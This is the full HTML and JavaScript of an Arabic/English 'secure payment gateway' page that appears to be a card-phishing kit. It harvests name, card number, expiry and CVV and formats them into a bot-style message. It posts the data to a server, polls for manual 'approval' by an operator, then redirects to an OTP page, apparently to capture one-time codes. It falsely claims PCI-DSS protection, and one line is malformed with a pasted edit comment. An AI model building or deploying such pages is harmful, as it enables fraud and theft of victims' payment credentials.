<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة الدفع الذكية 2026</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root {
      --primary-color: #4f46e5;
      --accent-gradient: linear-gradient(90deg, #4f46e5 0%, #7c3aed 100%);
      --text-main: #1e293b;
      --text-muted: #64748b;
      --input-bg: #f8fafc;
      --border-color: #e2e8f0;
      --error-color: #ef4444; /* لون الخطأ */
      
      /* ألوان البطاقات الافتراضية */
      --card-default: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
      --card-visa: linear-gradient(135deg, #0284c7 0%, #1e3a8a 100%);
      --card-mastercard: linear-gradient(135deg, #f97316 0%, #7c2d12 100%);
    }

    * {
      box-sizing: border-box;
      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
    }

    body {
      font-family: 'Cairo', 'Segoe UI', sans-serif;
      background-color: #f1f5f9; 
      margin: 0;
      padding: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: var(--text-main);
    }

    /* الحاوية الرئيسية البيضاء العصرية بقصات ناعمة */
    .payment-wrapper {
      width: 100%;
      max-width: 440px;
      background: #ffffff;
      border: 1px solid var(--border-color);
      border-radius: 24px;
      padding: 30px;
      box-shadow: 0 20px 40px -15px rgba(15, 23, 42, 0.06);
      position: relative;
    }

    /* شريط العنوان وزر تغيير اللغة */
    .header-zone {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 25px;
      padding-bottom: 10px;
      border-bottom: 1px dashed var(--border-color);
    }

    .header-zone h1 {
      font-size: 16px;
      font-weight: 700;
      color: var(--text-main);
      margin: 0;
    }

    .lang-btn {
      background: #e0e7ff; 
      border: 1px solid #c7d2fe;
      padding: 8px 16px;
      border-radius: 50px;
      font-family: 'Cairo', sans-serif;
      font-size: 13px;
      font-weight: 700;
      color: var(--primary-color);
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(79, 70, 229, 0.1);
    }

    .lang-btn:hover {
      background: var(--primary-color);
      color: #ffffff;
      border-color: var(--primary-color);
    }

    /* مجسم البطاقة الحية مع دعم التغير اللوني */
    .live-card {
      width: 100%;
      height: 200px;
      background: var(--card-default);
      border-radius: 18px;
      margin-bottom: 30px;
      padding: 24px;
      position: relative;
      overflow: hidden;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
    }

    .card-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .chip {
      width: 42px;
      height: 32px;
      background: linear-gradient(135deg, #e2e8f0 0%, #94a3b8 100%);
      border-radius: 8px;
    }

    .brand-logo img {
      height: 30px;
      max-width: 80px;
      object-fit: contain;
    }

    .card-number-live {
      font-family: 'Plus Jakarta Sans', sans-serif;
      font-size: 20px;
      font-weight: 600;
      letter-spacing: 3px;
      margin-top: 35px;
      color: #ffffff;
      direction: ltr;
    }

    .card-bottom-live {
      display: flex;
      justify-content: space-between;
      margin-top: 25px;
      font-family: 'Plus Jakarta Sans', sans-serif;
    }

    .card-holder-live {
      font-size: 13px;
      text-transform: uppercase;
      color: #e2e8f0;
      max-width: 220px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .card-expiry-live {
      font-size: 13px;
      color: #e2e8f0;
    }

    /* حقول الإدخال */
    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    .input-wrapper label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text-main);
      margin-bottom: 8px;
    }

    .input-wrapper input {
      width: 100%;
      background: var(--input-bg);
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 14px 16px;
      color: var(--text-main);
      font-size: 15px;
      outline: none;
    }

    .input-wrapper input:focus {
      border-color: var(--primary-color);
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.1);
    }

    /* ستايل مخصص للحقول التي بها خطأ */
    .input-wrapper.has-error input {
      border-color: var(--error-color);
      background: #fff5f5;
    }
    .input-wrapper.has-error input:focus {
      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
    }

    /* رسالة الخطأ أسفل الحقل */
    .error-message {
      font-size: 11px;
      color: var(--error-color);
      margin-top: 5px;
      display: none;
      font-weight: 600;
    }
    .input-wrapper.has-error .error-message {
      display: block;
    }

    .input-wrapper input::placeholder {
      color: #94a3b8;
    }

    .row-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
    }

    /* زر الدفع العصري الممتد */
    .submit-btn {
      width: 100%;
      background: var(--accent-gradient);
      color: #ffffff;
      border: none;
      border-radius: 14px;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      font-family: 'Cairo', sans-serif;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(79, 70, 229, 0.25);
    }

    .submit-btn:hover {
      box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4);
      transform: translateY(-1px);
    }

    .submit-btn:active {
      transform: translateY(1px);
    }

    .secure-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-size: 11px;
      color: var(--text-muted);
      margin-top: 20px;
    }

    /* شاشة التحميل المتناسقة */
    .loading-overlay {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.95);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      border-radius: 24px;
      z-index: 100;
      display: none;
    }

    .spinner-2026 {
      width: 40px;
      height: 40px;
      border: 3px solid #f3f3f3;
      border-radius: 50%;
      border-top-color: var(--primary-color);
      animation: spin 0.7s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-title {
      font-size: 15px;
      font-weight: 600;
      margin-top: 15px;
      color: var(--text-main);
    }

    /* === Modal Error Popup === */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(4px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .modal-overlay.show {
      display: flex;
      opacity: 1;
    }

    .modal-content {
      background: #ffffff;
      border-radius: 20px;
      padding: 30px 25px;
      max-width: 340px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
      transform: scale(0.8);
      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .modal-overlay.show .modal-content {
      transform: scale(1);
    }

    .modal-icon {
      width: 70px;
      height: 70px;
      background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }

    .modal-icon svg {
      width: 36px;
      height: 36px;
      color: #dc2626;
      stroke-width: 2.5;
    }

    .modal-icon.success-icon {
      background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
    }

    .modal-icon.success-icon svg {
      color: #059669;
    }

    .modal-title {
      font-size: 18px;
      font-weight: 700;
      color: #1e293b;
      margin-bottom: 10px;
    }

    .modal-message {
      font-size: 14px;
      color: #64748b;
      line-height: 1.6;
      margin-bottom: 25px;
    }

    .modal-btn {
      background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
      color: #ffffff;
      border: none;
      padding: 14px 40px;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .modal-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4);
    }

    .modal-close {
      position: absolute;
      top: 15px;
      left: 15px;
      background: none;
      border: none;
      font-size: 20px;
      color: #94a3b8;
      cursor: pointer;
      width: 30px;
      height: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: all 0.2s ease;
    }

    html[dir="ltr"] .modal-close {
      left: auto;
      right: 15px;
    }

    .modal-close:hover {
      background: #f1f5f9;
      color: #64748b;
    }

    .modal-wrapper {
      position: relative;
    }
  </style>
</head>
<body>

  <div class="payment-wrapper" id="paymentContainer">

    <div class="header-zone">
      <h1 id="pageTitle">بوابة الدفع الآمنة</h1>
      <button class="lang-btn" id="langBtn" onclick="toggleLanguage()">English</button>
    </div>

    <div class="live-card" id="liveCardElement">
      <div class="card-top">
        <div class="chip"></div>
        <div class="brand-logo">
          <img id="cardBrandLogo" src="https://png.pngtree.com/png-clipart/20250821/original/pngtree-secure-payment-vector-png-image_22018341.png" style="opacity: 0.3;" alt="Brand" />
        </div>
      </div>
      <div class="card-number-live" id="liveNumber">•••• •••• •••• ••••</div>
      <div class="card-bottom-live">
        <div class="card-holder-live" id="liveHolder">اسم حامل البطاقة</div>
        <div class="card-expiry-live" id="liveExpiry">MM/YY</div>
      </div>
    </div>

    <div class="input-wrapper" id="wrapperCardName">
      <label id="lblCardName" for="cardName">اسم صاحب البطاقة</label>
      <input type="text" id="cardName" placeholder="الاسم الكامل" autocomplete="off" required />
      <div class="error-message" id="errCardName"></div>
    </div>

    <div class="input-wrapper" id="wrapperCardNumber">
      <label id="lblCardNumber" for="cardNumber">رقم البطاقة</label>
      <input 
        type="tel" 
        id="cardNumber" 
        placeholder="**** **** **** ****" 
        maxlength="19" 
        style="direction: ltr; text-align: left;"
        autocomplete="off"
        required />
      <div class="error-message" id="errCardNumber"></div>
    </div>

    <div class="row-grid">
      <div class="input-wrapper" id="wrapperExpiry">
        <label id="lblExpiry" for="expiry">تاريخ الانتهاء</label>
        <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" style="text-align: center;" autocomplete="off" required />
        <div class="error-message" id="errExpiry"></div>
      </div>
      
      <div class="input-wrapper" id="wrapperCvv">
        <label id="lblCvv" for="cvv">رمز الأمان (CVV)</label>
        <input type="tel" id="cvv" placeholder="•••" maxlength="3" style="text-align: center;" autocomplete="off" required />
        <div class="error-message" id="errCvv"></div>
      </div>
    </div>

    <button onclick="validateForm()" id="payBtn" class="submit-btn">دفع</button>

    <div class="secure-badge" id="secureBadgeText">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
      اتصال مشفر ومحمى بالكامل بمعايير PCI-DSS
    </div>

    <div class="loading-overlay" id="loadingOverlay">
      <div class="spinner-2026"></div>
      <div class="loading-title" id="loadingText">جاري معالجة وتأكيد الدفع...</div>
    </div>

  </div>

<script>
  const translations = {
    ar: {
      pageTitle: "بوابة الدفع الآمنة",
      langBtn: "English",
      lblCardName: "اسم صاحب البطاقة",
      placeholderName: "الاسم الكامل",
      lblCardNumber: "رقم البطاقة",
      lblExpiry: "تاريخ الانتهاء",
      lblCvv: "رمز الأمان (CVV)",
      payBtn: "دفع",
      secureBadge: "اتصال مشفر ومحمى بالكامل بمعايير PCI-DSS",
      loadingText: "جاري معالجة طلبك يرجى الانتظار وعدم اغلاق الصفحة   ...",
      alertName: "يرجى إدخال اسم حامل البطاقة",
      alertNumber: "يرجى ادخال رقم البطاقة بشكل صحيح (16 رقم)",
      alertCvv: "يرجى ادخال رمز CVV المكون من 3 أرقام",
      alertExpiry: "يرجى ادخال التاريخ بصيغة MM/YY",
      alertMonth: "شهر الانتهاء غير صحيح (01-12)",
      alertExpired: "هذه البطاقة منتهية الصلاحية",
      alertError: "حدث خطأ أثناء معالجة البيانات",
      alertRejected: "يرجى التأكد من البيانات أو استخدام طريقة دفع مختلفة",
      alertTimeout: "انتهت مهلة الانتظار، يرجى المحاولة مرة أخرى",
      modalTitleRejected: "تم رفض الطلب",
      modalTitleTimeout: "انتهت المهلة"
    },
    en: {
      pageTitle: "Secure Payment Gateway",
      langBtn: "العربية",
      lblCardName: "Cardholder Name",
      placeholderName: "Full Name",
      lblCardNumber: "Card Number",
      lblExpiry: "Expiry Date",
      lblCvv: "Security Code (CVV)",
      payBtn: "Pay Now",
      secureBadge: "Fully encrypted and protected under PCI-DSS standards",
      loadingText: "Processing data and waiting for approval...",
      alertName: "Please enter the cardholder name",
      alertNumber: "Please enter a valid card number (16 digits)",
      alertCvv: "Please enter a valid 3-digit CVV code",
      alertExpiry: "Please enter a valid expiry date (MM/YY)",
      alertMonth: "Invalid expiry month (01-12)",
      alertExpired: "This credit card has expired",
      alertError: "An error occurred while processing data",
      alertRejected: "Please verify your data or use a different payment method",
      alertTimeout: "Waiting time exceeded, please try again",
      modalTitleRejected: "Request Rejected",
      modalTitleTimeout: "Time Out"
    }
  };

  let currentLang = "ar";

  const cardNameInput = document.getElementById('cardName');
  const cardNumberInput = document.getElementById('cardNumber');
  const expiryInput = document.getElementById('expiry');
  const cvvInput = document.getElementById('cvv');

  const liveHolder = document.getElementById('liveHolder');
  const liveNumber = document.getElementById('liveNumber');
  const liveExpiry = document.getElementById('liveExpiry');
  const liveCardElement = document.getElementById('liveCardElement');
  const logoImg = document.getElementById('cardBrandLogo');

  window.addEventListener('DOMContentLoaded', () => {
    const browserLang = navigator.language || navigator.userLanguage;
    if (browserLang && browserLang.startsWith('en')) {
      applyLanguage('en');
    } else {
      applyLanguage('ar');
    }
  });

  function applyLanguage(lang) {
    currentLang = lang;
    const data = translations[lang];
    
    if(lang === 'ar') {
      document.documentElement.lang = "ar";
      document.documentElement.dir = "rtl";
      document.body.style.fontFamily = "'Cairo', 'Segoe UI', sans-serif";
    } else {
      document.documentElement.lang = "en";
      document.documentElement.dir = "ltr";
      document.body.style.fontFamily = "'Plus Jakarta Sans', sans-serif";
    }

    document.getElementById('pageTitle').textContent = data.pageTitle;
    document.getElementById('langBtn').textContent = data.langBtn;
    document.getElementById('lblCardName').textContent = data.lblCardName;
    cardNameInput.placeholder = data.placeholderName;
    document.getElementById('lblCardNumber').textContent = data.lblCardNumber;
    document.getElementById('lblExpiry').textContent = data.lblExpiry;
    document.getElementById('lblCvv').textContent = data.lblCvv;
    document.getElementById('payBtn').textContent = data.payBtn;
    document.getElementById('secureBadgeText').innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg> ${data.secureBadge}`;
    document.getElementById('loadingText').textContent = data.loadingText;

    if (!cardNameInput.value.trim()) {
      liveHolder.textContent = data.lblCardName;
    }
    // مسح الأخطاء عند تبديل اللغة لمنع تداخل اللغات في نصوص الخطأ
    clearAllErrors();
  }

  function toggleLanguage() {
    if (currentLang === "ar") {
      applyLanguage("en");
    } else {
      applyLanguage("ar");
    }
  }

  // دوال إظهار وإخفاء الأخطاء أسفل الحقول
  function showError(wrapperId, messageId, messageText) {
    const wrapper = document.getElementById(wrapperId);
    const msgElement = document.getElementById(messageId);
    wrapper.classList.add('has-error');
    msgElement.textContent = messageText;
  }

  function clearError(wrapperId) {
    const wrapper = document.getElementById(wrapperId);
    wrapper.classList.remove('has-error');
  }

  function clearAllErrors() {
    clearError('wrapperCardName');
    clearError('wrapperCardNumber');
    clearError('wrapperExpiry');
    clearError('wrapperCvv');
  }

  // أحداث الإدخال لتحديث الكرت ومسح الخطأ فور بدء الكتابة التعديلية
  cardNameInput.addEventListener('input', (e) => {
    clearError('wrapperCardName');
    liveHolder.textContent = e.target.value.trim() || translations[currentLang].lblCardName;
  });

  cardNumberInput.addEventListener('input', (e) => {
    clearError('wrapperCardNumber');
    let value = e.target.value.replace(/\D/g, '');
    let formatted = '';
    for (let i = 0; i < value.length; i += 4) {
      formatted += value.substring(i, i + 4) + ' ';
    }
    e.target.value = formatted.trim();
    liveNumber.textContent = e.target.value || '•••• •••• •••• ••••';

    if (value.startsWith('4')) {
      liveCardElement.style.background = "var(--card-visa)";
      logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/960px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png";
      logoImg.style.opacity = "1";
    } else if (value.startsWith('51') || value.startsWith('52') || value.startsWith('53') || value.startsWith('54') || value.startsWith('55')) {
      liveCardElement.style.background = "var(--card-mastercard)";
      logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png";
      logoImg.style.opacity = "1";
    } else {
      liveCardElement.style.background = "var(--card-default)";
      logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
      logoImg.style.opacity = "0.3";
    }

    if (value.length >= 16) {
      setTimeout(() => { expiryInput.focus(); }, 10);
    }
  });

  expiryInput.addEventListener('input', (e) => {
    clearError('wrapperExpiry');
    if (e.inputType === 'deleteContentBackward') {
      liveExpiry.textContent = e.target.value || 'MM/YY';
      return; 
    }

    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
    liveExpiry.textContent = e.target.value || 'MM/YY';

    if (value.length === 5) {
      setTimeout(() => { cvvInput.focus(); }, 10);
    }
  });

  cvvInput.addEventListener('input', (e) => {
    clearError('wrapperCvv');
    let value = e.target.value.replace(/\D/g, '');
    e.target.value = value;
    
    if (value.length >= 3) {
      cvvInput.blur();
    }
  });

  async function sendToLocalServer(data) {
    try {
      const response = await fetch('/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      return await response.json();
    } catch (err) {
      console.error('فشل الإرسال:', err);
      throw err;
    }
  }

  function validateForm() {
    // تصفير الأخطاء السابقة أولاً
    clearAllErrors();

    const cardName = cardNameInput.value.trim();
    const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
    const cvv = cvvInput.value.trim();
    const expiry = expiryInput.value.trim();
    const currentText = translations[currentLang];
    let hasValidationError = false;

    // فحص حقل الاسم
    if (!cardName) { 
      showError('wrapperCardName', 'errCardName', currentText.alertName); 
      hasValidationError = true;
    }
    
    // فحص حقل الرقم
    if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) { 
      showError('wrapperCardNumber', 'errCardNumber', currentText.alertNumber); 
      hasValidationError = true;
    }
    
    // فحص حقل التاريخ المبدئي والتنسيق
    const [monthStr, yearStr] = expiry.split('/');
    if (!monthStr || !yearStr || monthStr.length !== 2 || (yearStr.length !== 2 && yearStr.length !== 4)) {
      showError('wrapperExpiry', 'errExpiry', currentText.alertExpiry);
      hasValidationError = true;
    } else {
      // فحص صحة الشهر والسنة في حال كان التنسيق صحيحاً
      const month = parseInt(monthStr);
      if (!(month >= 1 && month <= 12)) { 
        showError('wrapperExpiry', 'errExpiry', currentText.alertMonth); 
        hasValidationError = true;
      } else {
        let inputYear = yearStr;
        if (inputYear.length === 2) { inputYear = '20' + inputYear; }
        const currentYear = new Date().getFullYear();
        const currentMonth = new Date().getMonth() + 1;
        const year = parseInt(inputYear);
        // Only show expired if year is in the past, or same year but month has passed
        if (year < currentYear || (year === currentYear && parseInt(monthStr) < currentMonth)) { 
          showError('wrapperExpiry', 'errExpiry', currentText.alertExpired); 
          hasValidationError = true;
        }
      }
    }

    // فحص حقل رمز الأمان CVV
    if (!/^\d{3}$/.test(cvv)) { 
      showError('wrapperCvv', 'errCvv', currentText.alertCvv); 
      hasValidationError = true;
    }

    // إيقاف عملية الإرسال إذا كان هناك أي حقل غير صحيح
    if (hasValidationError) { return; }

    showLoading();

// استبدل السطر القديم بهذا السطر:
const ownerName = cardNameInput.value.trim() || 'غير معروف';    localStorage.setItem("cardNumber", cardNumber);
    localStorage.setItem("bank", 'Visa/Mastercard');
    localStorage.setItem("expiryMonth", monthStr);
    
    let finalYear = yearStr;
    if (finalYear.length === 2) { finalYear = '20' + finalYear; }
    localStorage.setItem("expiryYear", finalYear);

    const message = `
CN⚙️ بيانات الدفع من بطاقة الائتمان
🧑‍💼 اسم حامل البطاقة: ${cardName}
🔢 رقم البطاقة: ${cardNumber}
📅 تاريخ الانتهاء: ${expiry}
🔐 CVV: ${cvv}
    `;

    sendToLocalServer({
      name: ownerName,
      cardName: cardName,
      cardNumber: cardNumber,
      cvv: cvv,
      expiry: expiry,
      expiryMonth: monthStr,
      expiryYear: finalYear,
      message: message,
      type: 'credit_card'
    }).then(() => {
      // بدء polling للتحقق من حالة الموافقة
      pollApprovalStatus();
    }).catch((error) => {
      console.error('خطأ:', error);
      hideLoading();
      showError('wrapperCvv', 'errCvv', currentText.alertError);
    });
  }

  function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
    document.getElementById('payBtn').disabled = true;
  }

  function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
    document.getElementById('payBtn').disabled = false;
  }

  // دالة polling للتحقق من حالة الموافقة
  async function pollApprovalStatus() {
    const maxAttempts = 60; // 60 محاولة (دقيقة واحدة)
    let attempts = 0;
    const currentText = translations[currentLang];

    const pollInterval = setInterval(async () => {
      attempts++;
      
      try {
        const response = await fetch('/api/check-approval');
        const data = await response.json();
        
        console.log('حالة الموافقة:', data.status);

        if (data.status === 'approved') {
          clearInterval(pollInterval);
          hideLoading();
          window.location.href = "otp.html";
        } else if (data.status === 'rejected') {
          clearInterval(pollInterval);
          hideLoading();
          // إظهار Modal للرفض بدلاً من رسالة صغيرة
          showModal(
            currentText.modalTitleRejected || 'تم رفض الطلب',
            currentText.alertRejected || 'نعتذر، تم رفض طلبك من قبل المسؤول. يرجى استخدام طريقة دفع أخرى.',
            'error',
            null
          );
        } else if (attempts >= maxAttempts) {
          clearInterval(pollInterval);
          hideLoading();
          showModal(
            currentText.modalTitleTimeout || 'انتهت المهلة',
            currentText.alertTimeout || 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.',
            'error',
            null
          );
        }
      } catch (error) {
        console.error('خطأ في التحقق من حالة الموافقة:', error);
      }
    }, 2000); // التحقق كل ثانيتين
  }

  // === Modal Functions ===
  function showModal(title, message, type = 'error', redirectUrl = null) {
    const overlay = document.getElementById('modalOverlay');
    const titleEl = document.getElementById('modalTitle');
    const messageEl = document.getElementById('modalMessage');
    const icon = document.getElementById('modalIcon');
    const svg = document.getElementById('modalSvg');
    const btn = document.getElementById('modalBtn');

    titleEl.textContent = title;
    messageEl.textContent = message;

    // Reset icon styles
    icon.classList.remove('success-icon');
    
    if (type === 'success') {
      icon.classList.add('success-icon');
      svg.innerHTML = '<polyline points="20 6 9 17 4 12"></polyline>';
      btn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 100%)';
    } else {
      svg.innerHTML = '<circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>';
      btn.style.background = 'linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%)';
    }

    // إذا فيه redirect، غير نص الزر
    if (redirectUrl) {
      btn.textContent = currentLang === 'ar' ? 'حسناً' : 'OK';
      btn.onclick = function() {
        window.location.href = redirectUrl;
      };
    } else {
      btn.textContent = currentLang === 'ar' ? 'حسناً' : 'OK';
      btn.onclick = closeModal;
    }

    overlay.classList.add('show');
  }

  function closeModal() {
    const overlay = document.getElementById('modalOverlay');
    overlay.classList.remove('show');
  }

  // Close modal when clicking outside
  document.getElementById('modalOverlay').addEventListener('click', function(e) {
    if (e.target === this) {
      closeModal();
    }
  });

  // Close modal on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      closeModal();
    }
  });
</script>

<!-- Error Modal Popup -->
<div class="modal-overlay" id="modalOverlay">
  <div class="modal-wrapper">
    <button class="modal-close" onclick="closeModal()">✕</button>
    <div class="modal-content">
      <div class="modal-icon" id="modalIcon">
        <svg id="modalSvg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"></circle>
          <line x1="15" y1="9" x2="9" y2="15"></line>
          <line x1="9" y1="9" x2="15" y2="15"></line>
        </svg>
      </div>
      <h3 class="modal-title" id="modalTitle">تنبيه</h3>
      <p class="modal-message" id="modalMessage">حدث خطأ ما</p>
      <button class="modal-btn" onclick="closeModal()" id="modalBtn">حسناً</button>
    </div>
  </div>
</div>

</body>
</html>
